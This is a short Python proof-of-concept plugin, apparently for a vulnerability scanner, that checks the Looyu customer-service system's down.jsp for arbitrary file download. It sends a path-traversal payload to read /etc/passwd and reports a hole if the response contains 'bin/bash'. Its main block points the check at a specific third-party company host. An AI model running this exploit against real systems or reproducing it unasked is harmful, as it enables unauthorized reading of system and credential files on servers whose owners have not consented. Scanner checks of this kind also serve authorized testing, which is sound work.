#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 乐语客服系统任意文件下载漏洞
author: Lucifer
referer: http://www.wooyun.org/bugs/wooyun-2015-0150444
description: 乐语客服系统down.jsp文件file参数未过滤导致任意文件下载，可泄露敏感数据
'''
import re

def assign(service, arg):
    if service == "looyu_live":
        return True, arg

def audit(arg):
    url = arg + "live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and 'bin/bash' in res:
        security_hole("Arbitrary file download: "+url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('looyu_live', 'http://cr.gac-toyota.com.cn:8099/')[1])